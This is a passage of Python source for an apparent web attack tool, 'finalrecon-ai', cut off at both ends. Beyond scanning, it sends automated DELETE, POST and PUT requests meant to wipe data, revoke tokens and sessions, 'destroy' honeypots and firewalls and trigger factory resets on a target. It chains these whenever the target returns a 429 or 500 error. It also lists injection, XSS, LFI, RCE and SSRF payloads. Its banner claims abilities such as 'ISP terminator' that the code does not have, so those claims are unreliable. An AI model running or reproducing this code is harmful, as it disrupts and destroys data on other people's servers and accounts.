    'config': ['/another/config.json', '/other/config.json'],
    'users': ['/another/users.txt', '/other/users.txt'],
    'suspicious': ['/another/suspicious.txt', '/other/suspicious.txt'],
    'tokens': ['/another/tokens/', '/other/tokens/'],
    'devices': ['/another/devices/', '/other/devices/'],
}

SERVER_COOKIES_MAP = {
    'HTTP': HTTP_COOKIES_TARGETS,
    'HTTPS': HTTPS_COOKIES_TARGETS,
    'GWS': GWS_COOKIES_TARGETS,
    'ESF': ESF_COOKIES_TARGETS,
    'ANOTHER': ANOTHER_COOKIES_TARGETS,
}

# ============================================
# 5000: TOKEN/API/DEVICE CLEANER TARGETS
# ============================================
TOKEN_CLEANER_TARGETS = {
    'api_tokens': ['/api/tokens', '/api/token', '/api/v1/tokens', '/api/v2/tokens',
                   '/admin/api/tokens', '/admin/tokens', '/tokens', '/token'],
    'session_tokens': ['/session/tokens', '/session/token', '/sessions',
                       '/admin/sessions', '/api/sessions'],
    'device_tokens': ['/device/tokens', '/device/token', '/devices',
                      '/admin/devices', '/api/devices'],
    'oauth_tokens': ['/oauth/tokens', '/oauth/token', '/oauth2/tokens',
                     '/admin/oauth/tokens', '/api/oauth/tokens'],
    'jwt_tokens': ['/jwt/tokens', '/jwt/token', '/admin/jwt/tokens',
                   '/api/jwt/tokens'],
    'refresh_tokens': ['/refresh-tokens', '/refresh_token', '/admin/refresh-tokens'],
    'access_tokens': ['/access-tokens', '/access_token', '/admin/access-tokens'],
}

# ============================================
# DIRECTORY WORDLIST
# ============================================
DEFAULT_DIRECTORY_WORDLIST = [
    'admin', 'administrator', 'login', 'wp-admin', 'wp-login', 'dashboard',
    'api', 'api/v1', 'api/v2', 'api/v3', 'graphql', 'rest',
    'backup', 'backups', 'bak', 'old', 'temp', 'tmp',
    'config', 'configuration', 'settings', 'setup', 'install',
    'db', 'database', 'sql', 'mysql', 'phpmyadmin', 'adminer',
    'test', 'tests', 'testing', 'dev', 'development', 'stage', 'staging',
    'private', 'secret', 'internal', 'hidden', 'secure',
    'uploads', 'upload', 'files', 'file', 'media', 'images', 'img',
    'js', 'css', 'assets', 'static', 'public', 'dist',
    'docs', 'documentation', 'help', 'support', 'faq',
    'user', 'users', 'account', 'accounts', 'profile', 'profiles',
    'log', 'logs', 'error', 'errors', 'debug', 'trace',
    '.git', '.git/config', '.env', '.htaccess', 'robots.txt', 'sitemap.xml',
    'server-status', 'server-info', 'phpinfo.php', 'info.php',
    'web.config', 'crossdomain.xml', 'clientaccesspolicy.xml',
    'cgi-bin', 'cgi', 'bin', 'scripts', 'cron', 'jobs',
    'portal', 'console', 'manager', 'management', 'control',
    'auth', 'oauth', 'sso', 'saml', 'ldap', 'login.php', 'signin',
    'register', 'signup', 'forgot', 'reset', 'password',
    'invoice', 'invoices', 'order', 'orders', 'cart', 'checkout',
    'payment', 'payments', 'billing', 'subscribe', 'subscription',
    'honeypot', 'honey', 'trap', 'decoy', 'bait', 'lure', 'canary', 'tarpit',
    'cleaner', 'cleaner-data', 'factory-restart', 'factory-reset',
    'tokens', 'token', 'devices', 'device', 'api-tokens', 'session-tokens',
]

# ============================================
# COMMON PORTS
# ============================================
COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 1723, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 2181,
    2375, 2376, 3000, 3306, 3389, 4443, 5000, 5432, 5601, 5672, 5900,
    6379, 6443, 7001, 7002, 8000, 8008, 8080, 8081, 8082, 8083, 8086,
    8088, 8090, 8123, 8161, 8180, 8200, 8443, 8500, 8529, 8834, 8888,
    8983, 9000, 9001, 9042, 9090, 9092, 9100, 9200, 9300, 9418, 9443,
    9999, 10000, 10250, 11211, 15672, 27017, 27018, 28017, 50000, 50070,
]

# ============================================
# VULN PATTERNS
# ============================================
VULN_PATTERNS = {
    'SQL Injection': ["'", "\"", "`", "')", "';", "' OR '1'='1", "' OR 1=1--"],
    'XSS': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    'LFI': ["../../../etc/passwd", "/etc/passwd%00"],
    'RCE': [";id", "|id", "`id`", "$(id)"],
    'SSRF': ["http://127.0.0.1", "http://169.254.169.254"],
    'Open Redirect': ["//evil.com", "https://evil.com"],
}

CONFIG = {'timeout': 10, 'export_dir': 'finalrecon-ai-results'}


# ============================================
# SAFE FILE OPS
# ============================================
def safe_makedirs(path):
    try:
        if path and not os.path.exists(path):
            os.makedirs(path, exist_ok=True)
        return True
    except Exception:
        return False


# ============================================
# 5000 MAIN CLASS
# ============================================
class AutonomousAIRobot:
    def __init__(self, target=None, args=None):
        self.target = target
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': get_random_ua()})

        self.server_suspicious_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.server_not_suspicious_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.server_connection_map_data = {}

        self.cookies_data_deleted_okay = []
        self.cookies_site_data_deleted_okay = []
        self.total_okay = 0
        self.total_failed = 0

        self.error_429_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.error_500_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.error_destroyer_stats = {
            '429_detected': 0, '429_destroyed': 0,
            '500_detected': 0, '500_destroyed': 0,
        }

        self.waf_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.waf_destroyed = []
        self.isp_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.isp_terminated = []
        self.waf_isp_stats = {'waf_detected': 0, 'waf_destroyed': 0,
                              'isp_detected': 0, 'isp_terminated': 0}

        self.honeypot_found = {'HTTP': [], 'HTTPS': [], 'GWS': [], 'ESF': [], 'ANOTHER': []}
        self.honeypot_destroyed = []
        self.honeypot_wall_broken = []
        self.honeypot_stats = {
            'honeypot_detected': 0, 'honeypot_destroyed': 0,
            'honeypot_disabled': 0, 'honeypot_reset': 0,
            'honeypot_removed': 0, 'honeypot_wall_broken': 0,
        }

        self.firewall_wall_broken = []
        self.firewall_stats = {
            'firewall_wall_broken': 0, 'firewall_destroyed': 0, 'firewall_purged': 0,
        }

        self.cleaner_stats = {
            'data_cleaned': 0, 'cookies_cleaned': 0, 'tokens_cleaned': 0,
            'devices_cleaned': 0, 'sessions_cleaned': 0, 'total_cleaned': 0,
        }

        self.token_stats = {
            'api_tokens_destroyed': 0, 'session_tokens_destroyed': 0,
            'device_tokens_destroyed': 0, 'oauth_tokens_destroyed': 0,
            'jwt_tokens_destroyed': 0, 'refresh_tokens_destroyed': 0,
            'access_tokens_destroyed': 0, 'total_tokens_destroyed': 0,
        }

        self.factory_stats = {
            'factory_restarts': 0, 'factory_resets': 0, 'factory_defaults': 0,
            'factory_hard_resets': 0, 'factory_wipes': 0, 'total_factory_ops': 0,
        }

        self.honeypot_server_stats = {
            'server_started': 0, 'server_pid': None,
            'server_host': DEFAULT_HONEYPOT_HOST,
            'server_port': DEFAULT_HONEYPOT_PORT,
            'log_file': 'http_honeypot_5000.log',
            'process': None, 'temp_script': None,
        }

        self.isp_enabled = []
        self.ips_unblocked = []
        self.services_restarted = []
        self.enable_unblock_stats = {
            'isp_enabled': 0, 'ips_unblocked': 0, 'blocks_removed': 0,
            'blacklist_cleared': 0, 'firewall_reset': 0, 'access_restored': 0,
            'firewall_restarted': 0, 'isp_restarted': 0, 'waf_restarted': 0,
            'server_restarted': 0, 'application_restarted': 0,
            'service_restarted': 0, 'all_restarted': 0,
        }

        self.security_audit_results = {}
        self.data_leak_findings = []
        self.risk_assessment = {}

        self.results_5000 = {}
        self.subdomain_results = []
        self.dns_results = {}
        self.whois_results = {}
        self.ssl_results = {}
        self.header_results = {}
        self.isp_results = {}
        self.directory_results = []
        self.port_scan_results = []
        self.crawler_results = []
        self.vuln_scan_results = []

        if self.target:
            self.parse_target()

    def print_banner(self):
        art = r"""
================================================================================
   ______ _             _ _____                            _____ _____
  |  ____(_)           | |  __ \                     /\   |_   _|  __ \
  | |__   _ _ __   __ _| | |__) |___  ___ ___  _ __ /  \    | | | |  | |
  |  __| | | '_ \ / _` | |  _  // _ \/ __/ _ \| '_ / /\ \   | | | |  | |
  | |    | | | | | (_| | | | \ \  __/ (_| (_) | | / ____ \ _| |_| |__| |
  |_|    |_|_| |_|\__,_|_|_|  \_\___|\___\___/|_|/_/    \_\_____|_____/

      FINALRECON-AI - ULTIMATE 5000 WEB SERVER ONLY EDITION
      Version: 5000.0 - NOT FOR LOCAL COMPUTER
      File: finalrecon-ai.py

   5000 NEW: CLEANER DATA | FACTORY RESTART | TOKEN DESTROYER
   5000 NEW: HONEYPOT WALL BREAK | FIREWALL WALL BREAK
   5000 NEW: SUPREME | SINGULARITY | HYPERNOVA PATTERNS
   5000 NEW: HTTP (Port 80) | HTTPS (Port 443)
   5000 NEW: SUBDOMAIN ENUM | DNS ENUM | WHOIS LOOKUP
   5000 NEW: SSL ANALYSIS | HEADER ENUM | ISP INFO
   5000 NEW: DIRECTORY BRUTEFORCE | PORT SCAN
   5000 NEW: CRAWLER/SPIDER | VULNERABILITY SCANNING
   5000 NEW: WAF DESTROYER | ISP TERMINATOR
   5000 NEW: ERROR 429/500 DESTROYER
   5000 NEW: FULLY AUTONOMOUS AI ROBOT
   5000 NEW: Results automatically exported to TXT

   WARNING: WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!
   WARNING: USE ONLY ON AUTHORIZED TARGETS!
================================================================================
"""
        print(Fore.SUPREME5000 + art + Fore.RESET + "\n")
        print(Fore.GREEN + "[>] Version: " + VERSION)
        print(Fore.MAGENTA + "[>] Release: " + RELEASE_NAME)
        print(Fore.RED + "[>] WARNING: WEB SERVER ONLY - NOT LOCAL COMPUTER")
        print(Fore.AUTONOMOUS + "[>] MODE: FULLY AUTONOMOUS AI ROBOT")
        print(Fore.CLEANER + "[>] CLEANER DATA: ACTIVE")
        print(Fore.FACTORY + "[>] FACTORY RESTART: ACTIVE")
        print(Fore.TOKEN + "[>] TOKEN DESTROYER: ACTIVE")
        print(Fore.HONEYPOT_SERVER + f"[>] HONEYPOT SERVER: PORT {DEFAULT_HONEYPOT_PORT}")
        print(Fore.YELLOW + f"[>] Twisted: {'YES' if TWISTED_AVAILABLE else 'NO'}")
        print(Fore.YELLOW + f"[>] BeautifulSoup: {'YES' if BS4_AVAILABLE else 'NO'}")
        print()

    def parse_target(self):
        if not self.target:
            return
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        if self.target.endswith('/'):
            self.target = self.target[:-1]
        split_url = parse.urlsplit(self.target)
        self.protocol = split_url.scheme
        self.hostname = split_url.hostname
        # 5000: -p port support
        if self.args and hasattr(self.args, 'p') and self.args.p:
            self.port = self.args.p
        elif split_url.port:
            self.port = split_url.port
        else:
            self.port = DEFAULT_HTTPS_PORT if self.protocol == 'https' else DEFAULT_HTTP_PORT
        try:
            ipaddress.ip_address(self.hostname)
            self.ip = self.hostname
        except ValueError:
            try:
                self.ip = socket.gethostbyname(self.hostname)
                print(Fore.CYAN + f"[*] IP Address: {self.ip}")
            except Exception as e:
                print(Fore.RED + f"[-] Unable to get IP: {e}")
                sys.exit(1)
        self.base_url = f"{self.protocol}://{self.hostname}:{self.port}"

    # ============================================
    # SERVER INFO (5000 NEW)
    # ============================================
    def server_info(self):
        print(Fore.INFO + "\n" + "=" * 80)
        print(Fore.INFO + "[*] 5000 SERVER INFO - ALL WEB SERVERS")
        print(Fore.INFO + "=" * 80)

        for server_name, info in SERVER_CONNECTION_MAP.items():
            print_info(f"\n[{server_name}] {info['description']}")
            print_info(f"  Protocol: {info['protocol']}")
            print_info(f"  Port: {info['port'] if info['port'] else 'auto'}")

            # Test connection
            for test_path in SERVER_SUSPICIOUS_DATABASE.get(server_name, {}).get('suspicious_paths', [])[:3]:
                try:
                    test_url = f"{self.base_url}{test_path}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        print_info(f"  → Connected: {test_url} ({r.status_code})")
                        break
                except Exception:
                    pass

        print(Fore.INFO + "\n" + "=" * 80)

    # ============================================
    # 5000: HONEYPOT WALL BREAKER (PHASE 1)
    # ============================================
    def break_honeypot_wall(self, server_name=None):
        print(Fore.WALL + "\n" + "=" * 80)
        print(Fore.WALL + "[!!!] 5000 HONEYPOT WALL BREAKER - PHASE 1")
        print(Fore.WALL + "=" * 80)

        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        broken = 0

        for srv in servers:
            print_wall(srv, "BREAKING HONEYPOT WALL", "")

            for category, patterns in HONEYPOT_PATTERNS.items():
                if category != 'honeypot_wall_break':
                    continue
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            broken += 1
                            self.honeypot_stats['honeypot_wall_broken'] += 1
                            self.honeypot_wall_broken.append({
                                'server': srv, 'path': pattern, 'status': r.status_code,
                            })
                            print_wall(srv, pattern, "HONEYPOT-WALL-BROKEN")
                            try:
                                self.session.post(test_url, data={
                                    'action': 'wall-break', 'honeypot': 'destroy',
                                    'disable': True, 'remove': True,
                                }, timeout=2, verify=False)
                                self.session.delete(test_url, timeout=2, verify=False)
                            except Exception:
                                pass
                    except Exception:
                        pass

        print(Fore.WALL + f"\n[!!!] HONEYPOT WALLS BROKEN: {broken}")
        return broken

    # ============================================
    # 5000: FIREWALL WALL BREAKER (PHASE 2)
    # ============================================
    def break_firewall_wall(self, server_name=None):
        print(Fore.WALL + "\n" + "=" * 80)
        print(Fore.WALL + "[!!!] 5000 FIREWALL WALL BREAKER - PHASE 2")
        print(Fore.WALL + "=" * 80)

        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        broken = 0

        for srv in servers:
            print_wall(srv, "BREAKING FIREWALL WALL", "")

            for category, patterns in FIREWALL_WALL_PATTERNS.items():
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            broken += 1
                            self.firewall_stats['firewall_wall_broken'] += 1
                            self.firewall_wall_broken.append({
                                'server': srv, 'path': pattern, 'status': r.status_code,
                            })
                            print_wall(srv, pattern, f"FIREWALL-{category.upper()}")
                            try:
                                self.session.post(test_url, data={
                                    'action': 'break', 'firewall': 'destroy',
                                    'bypass': True, 'disable': True,
                                }, timeout=2, verify=False)
                            except Exception:
                                pass
                    except Exception:
                        pass

        print(Fore.WALL + f"\n[!!!] FIREWALL WALLS BROKEN: {broken}")
        return broken

    # ============================================
    # HONEYPOT DETECT/DESTROY (PHASE 3)
    # ============================================
    def detect_honeypot(self, server_name=None):
        print(Fore.HONEYPOT + "\n" + "=" * 80)
        print(Fore.HONEYPOT + "[!!!] 5000 HONEYPOT DETECTOR")
        print(Fore.HONEYPOT + "=" * 80)

        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        detected = 0

        for srv in servers:
            for path in SERVER_SUSPICIOUS_DATABASE.get(srv, {}).get('suspicious_paths', [])[:10]:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    headers_str = str(r.headers).lower()
                    content_str = r.text.lower()[:5000]
                    cookies_str = str(r.cookies).lower()

                    for hp_name, signatures in HONEYPOT_SIGNATURES.items():
                        for sig in signatures:
                            if sig in headers_str or sig in content_str or sig in cookies_str:
                                detected += 1
                                self.honeypot_stats['honeypot_detected'] += 1
                                self.honeypot_found[srv].append({
                                    'server': srv, 'path': path, 'honeypot': hp_name,
                                })
                                print_honeypot(srv, path, f"- {hp_name}")
                                break
                except Exception:
                    pass

            for pattern in HONEYPOT_PATTERNS.get('honeypot_detect', []):
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        detected += 1
                        self.honeypot_stats['honeypot_detected'] += 1
                        print_honeypot(srv, pattern, "- Honeypot path found")
                except Exception:
                    pass

        print(Fore.HONEYPOT + f"\n[!!!] HONEYPOT DETECTED: {detected}")
        return detected

    def destroy_honeypot(self, server_name=None):
        print(Fore.HONEYPOT + "\n" + "=" * 80)
        print(Fore.HONEYPOT + "[!!!] 5000 HONEYPOT DESTROYER - PHASE 3")
        print(Fore.HONEYPOT + "=" * 80)

        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        destroyed = 0

        for srv in servers:
            for category, patterns in HONEYPOT_PATTERNS.items():
                if category == 'honeypot_detect':
                    continue
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            destroyed += 1
                            if category == 'honeypot_destroy':
                                self.honeypot_stats['honeypot_destroyed'] += 1
                            elif category == 'honeypot_disable':
                                self.honeypot_stats['honeypot_disabled'] += 1
                            elif category == 'honeypot_reset':
                                self.honeypot_stats['honeypot_reset'] += 1
                            elif category == 'honeypot_remove':
                                self.honeypot_stats['honeypot_removed'] += 1

                            print_terminator(srv, pattern, f"HONEYPOT-{category.upper()}")
                            try:
                                self.session.delete(test_url, timeout=2, verify=False)
                                self.session.post(test_url, data={
                                    'action': 'destroy', 'honeypot': 'off',
                                }, timeout=2, verify=False)
                            except Exception:
                                pass
                    except Exception:
                        pass

            for hp_type, patterns in HONEYPOT_TYPES.items():
                for pattern in patterns:
                    try:
                        test_url = f"{self.base_url}{pattern}"
                        r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        if r.status_code in [200, 201, 202, 204, 301, 302]:
                            destroyed += 1
                            self.honeypot_stats['honeypot_destroyed'] += 1
                            print_terminator(srv, pattern, f"{hp_type.upper()}-DESTROYED")
                    except Exception:
                        pass

        print(Fore.HONEYPOT + f"\n[!!!] HONEYPOT DESTROYED: {destroyed}")
        return destroyed

    # ============================================
    # 5000: CLEANER DATA (PHASE 4) - WITH OKAY REPORT
    # ============================================
    def cleaner_data_all_servers(self):
        print(Fore.CLEANER + "\n" + "=" * 80)
        print(Fore.CLEANER + "[!!!] 5000 CLEANER DATA - ALL SERVERS")
        print(Fore.CLEANER + "=" * 80)

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            self._cleaner_data_server(server_name)

        print(Fore.CLEANER + "\n" + "=" * 80)
        print(Fore.CLEANER + "[!!!] CLEANER DATA FINAL REPORT")
        print(Fore.CLEANER + "=" * 80)
        for key, value in self.cleaner_stats.items():
            print(Fore.OKGREEN + f"[+] OKAY - {key}: {value}" + Fore.RESET)
        print(Fore.CLEANER + "=" * 80 + "\n")

    def _cleaner_data_server(self, server_name):
        print(Fore.CLEANER + "\n" + "=" * 80)
        print(Fore.CLEANER + f"[!!!] {server_name} - CLEANER DATA")
        print(Fore.CLEANER + "=" * 80)

        if server_name not in SERVER_COOKIES_MAP:
            return

        targets = SERVER_COOKIES_MAP[server_name]
        total_targets = sum(len(paths) for paths in targets.values())
        current = 0
        cleaned_ok = 0

        for category, paths in targets.items():
            for path in paths:
                current += 1
                print_progress(current, total_targets, f"{server_name}/{category}: {path}")

                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 403]:
                        # 5000: CLEANER DATA - all methods
                        self.session.delete(test_url, timeout=3, verify=False)
                        self.session.post(test_url, data={
                            'action': 'clean', 'type': category,
                            'purge': True, 'wipe': True,
                        }, timeout=3, verify=False)
                        self.session.put(test_url, data={
                            'clean': True, 'purge': True, 'wipe': True,
                        }, timeout=3, verify=False)
                        self.session.patch(test_url, data={
                            'status': 'cleaned',
                        }, timeout=3, verify=False)

                        # Update stats
                        if category == 'cookies':
                            self.cleaner_stats['cookies_cleaned'] += 1
                        elif category == 'sessions':
                            self.cleaner_stats['sessions_cleaned'] += 1
                        elif category in ['data', 'site_data']:
                            self.cleaner_stats['data_cleaned'] += 1
                        elif category == 'tokens':
                            self.cleaner_stats['tokens_cleaned'] += 1
                        elif category == 'devices':
                            self.cleaner_stats['devices_cleaned'] += 1

                        self.cleaner_stats['total_cleaned'] += 1
                        cleaned_ok += 1
                        self.total_okay += 1

                        print()
                        print_cleaner(f"[+] OKAY - CLEANED [{server_name}/{category}]: {path}")

                        self.cookies_data_deleted_okay.append({
                            'server': server_name, 'category': category,
                            'path': path, 'status': 'CLEANED_OKAY',
                        })
                except Exception:
                    pass

        print_cleaner(f"\n[+] OKAY - {server_name} CLEANER DATA: {cleaned_ok} items")

    # ============================================
    # 5000: TOKEN DESTROYER (PHASE 5)
    # ============================================
    def destroy_tokens_all_servers(self):
        print(Fore.TOKEN + "\n" + "=" * 80)
        print(Fore.TOKEN + "[!!!] 5000 TOKEN DESTROYER - ALL SERVERS")
        print(Fore.TOKEN + "=" * 80)

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            self._destroy_tokens_server(server_name)

        print(Fore.TOKEN + "\n" + "=" * 80)
        print(Fore.TOKEN + "[!!!] TOKEN DESTROYER FINAL REPORT")
        print(Fore.TOKEN + "=" * 80)
        for key, value in self.token_stats.items():
            print(Fore.OKGREEN + f"[+] OKAY - {key}: {value}" + Fore.RESET)
        print(Fore.TOKEN + "=" * 80 + "\n")

    def _destroy_tokens_server(self, server_name):
        print(Fore.TOKEN + "\n" + "=" * 80)
        print(Fore.TOKEN + f"[!!!] {server_name} - TOKEN/API/DEVICE DESTROYER")
        print(Fore.TOKEN + "=" * 80)

        for token_type, patterns in TOKEN_CLEANER_TARGETS.items():
            for pattern in patterns:
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302, 403]:
                        self.session.delete(test_url, timeout=3, verify=False)
                        self.session.post(test_url, data={
                            'action': 'destroy', 'token_type': token_type,
                            'purge': True, 'revoke': True, 'kill': True,
                        }, timeout=3, verify=False)
                        self.session.put(test_url, data={
                            'destroy_token': True, 'revoke_all': True,
                        }, timeout=3, verify=False)

                        if token_type == 'api_tokens':
                            self.token_stats['api_tokens_destroyed'] += 1
                        elif token_type == 'session_tokens':
                            self.token_stats['session_tokens_destroyed'] += 1
                        elif token_type == 'device_tokens':
                            self.token_stats['device_tokens_destroyed'] += 1
                        elif token_type == 'oauth_tokens':
                            self.token_stats['oauth_tokens_destroyed'] += 1
                        elif token_type == 'jwt_tokens':
                            self.token_stats['jwt_tokens_destroyed'] += 1
                        elif token_type == 'refresh_tokens':
                            self.token_stats['refresh_tokens_destroyed'] += 1
                        elif token_type == 'access_tokens':
                            self.token_stats['access_tokens_destroyed'] += 1

                        self.token_stats['total_tokens_destroyed'] += 1
                        print_token(f"[+] OKAY - DESTROYED [{server_name}/{token_type}]: {pattern}")
                except Exception:
                    pass

        # 5000: Token destroy patterns
        for category, patterns in TOKEN_5000_PATTERNS.items():
            for pattern in patterns:
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        self.session.delete(test_url, timeout=2, verify=False)
                        self.session.post(test_url, data={'action': 'destroy'},
                                          timeout=2, verify=False)
                        print_terminator(server_name, pattern, f"TOKEN-{category.upper()}")
                except Exception:
                    pass

    # ============================================
    # 5000: FACTORY RESTART (PHASE 6)
    # ============================================
    def factory_restart_all_servers(self):
        print(Fore.FACTORY + "\n" + "=" * 80)
        print(Fore.FACTORY + "[!!!] 5000 FACTORY RESTART - ALL SERVERS")
        print(Fore.FACTORY + "=" * 80)

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            self._factory_restart_server(server_name)

        print(Fore.FACTORY + "\n" + "=" * 80)
        print(Fore.FACTORY + "[!!!] FACTORY RESTART FINAL REPORT")
        print(Fore.FACTORY + "=" * 80)
        for key, value in self.factory_stats.items():
            print(Fore.OKGREEN + f"[+] OKAY - {key}: {value}" + Fore.RESET)
        print(Fore.FACTORY + "=" * 80 + "\n")

    def _factory_restart_server(self, server_name):
        print(Fore.FACTORY + "\n" + "=" * 80)
        print(Fore.FACTORY + f"[!!!] {server_name} - FACTORY RESTART")
        print(Fore.FACTORY + "=" * 80)

        for category, patterns in FACTORY_RESTART_PATTERNS.items():
            for pattern in patterns:
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        if category == 'factory_restart':
                            self.factory_stats['factory_restarts'] += 1
                        elif category == 'factory_reset':
                            self.factory_stats['factory_resets'] += 1
                        elif category == 'factory_default':
                            self.factory_stats['factory_defaults'] += 1
                        elif category == 'factory_hard_reset':
                            self.factory_stats['factory_hard_resets'] += 1
                        elif category == 'factory_wipe':
                            self.factory_stats['factory_wipes'] += 1

                        self.factory_stats['total_factory_ops'] += 1
                        print_factory(server_name, pattern, f"FACTORY-{category.upper()}-SUCCESS")

                        try:
                            self.session.post(test_url, data={
                                'action': 'factory-restart', 'services': 'all',
                                'wipe': True, 'reset': True,
                            }, timeout=3, verify=False)
                            self.session.put(test_url, data={
                                'factory_restart': True, 'hard_reset': True,
                            }, timeout=3, verify=False)
                        except Exception:
                            pass
                except Exception:
                    pass

        # General restart patterns
        for category, patterns in RESTART_PATTERNS.items():
            for pattern in patterns:
                try:
                    test_url = f"{self.base_url}{pattern}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 201, 202, 204, 301, 302]:
                        print_restart(server_name, pattern, f"{category.upper()}")
                        self.enable_unblock_stats['all_restarted'] += 1
                except Exception:
                    pass

    # ============================================
    # 5000: ERROR 429/500 WITH AUTO CHAIN
    # ============================================
    def detect_and_destroy_error_429(self, server_name=None):
        print(Fore.ERROR429 + "\n" + "=" * 80)
        print(Fore.ERROR429 + "[!!!] 5000 ERROR 429 DETECTOR - AUTO CHAIN")
        print(Fore.ERROR429 + "=" * 80)

        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        detected = 0
        destroyed = 0
        trigger_chain = False

        for srv in servers:
            for path in SERVER_SUSPICIOUS_DATABASE.get(srv, {}).get('suspicious_paths', [])[:15]:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code == 429:
                        detected += 1
                        self.error_destroyer_stats['429_detected'] += 1
                        print_error_429(srv, path, "- TRIGGERING CHAIN")
                        trigger_chain = True
                        if self._destroy_429(srv, test_url, path):
                            destroyed += 1
                            self.error_destroyer_stats['429_destroyed'] += 1
                except Exception:
                    pass

        # 5000: AUTO CHAIN when 429 detected
        if trigger_chain:
            print(Fore.DESTROYER + "\n[!!!] 429 DETECTED - TRIGGERING 5000 CHAIN:")
            print(Fore.WALL + "[1] Breaking Honeypot Wall...")
            self.break_honeypot_wall()
            print(Fore.HONEYPOT + "[2] Destroying Honeypot...")
            self.destroy_honeypot()
            print(Fore.WALL + "[3] Breaking Firewall Wall...")
            self.break_firewall_wall()
            print(Fore.CLEANER + "[4] Cleaner Data...")
            self.cleaner_data_all_servers()
            print(Fore.TOKEN + "[5] Destroying Tokens...")
            self.destroy_tokens_all_servers()
            print(Fore.FACTORY + "[6] Factory Restart...")
            self.factory_restart_all_servers()

        print(Fore.ERROR429 + f"\n[!!!] 429 DETECTED: {detected}")
        print(Fore.OKGREEN + f"[+] 429 DESTROYED: {destroyed}" + Fore.RESET)
        return detected, destroyed

    def detect_and_destroy_error_500(self, server_name=None):
        print(Fore.ERROR500 + "\n" + "=" * 80)
        print(Fore.ERROR500 + "[!!!] 5000 ERROR 500 DETECTOR - AUTO CHAIN")
        print(Fore.ERROR500 + "=" * 80)

        servers = [server_name] if server_name else ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']
        detected = 0
        destroyed = 0
        trigger_chain = False

        for srv in servers:
            for path in SERVER_SUSPICIOUS_DATABASE.get(srv, {}).get('suspicious_paths', [])[:15]:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code == 500:
                        detected += 1
                        self.error_destroyer_stats['500_detected'] += 1
                        print_error_500(srv, path, "- TRIGGERING CHAIN")
                        trigger_chain = True
                        if self._destroy_500(srv, test_url, path):
                            destroyed += 1
                            self.error_destroyer_stats['500_destroyed'] += 1
                except Exception:
                    pass

        if trigger_chain:
            print(Fore.DESTROYER + "\n[!!!] 500 DETECTED - TRIGGERING 5000 CHAIN:")
            print(Fore.WALL + "[1] Breaking Honeypot Wall...")
            self.break_honeypot_wall()
            print(Fore.HONEYPOT + "[2] Destroying Honeypot...")
            self.destroy_honeypot()
            print(Fore.WALL + "[3] Breaking Firewall Wall...")
            self.break_firewall_wall()
            print(Fore.CLEANER + "[4] Cleaner Data...")
            self.cleaner_data_all_servers()
            print(Fore.TOKEN + "[5] Destroying Tokens...")
            self.destroy_tokens_all_servers()
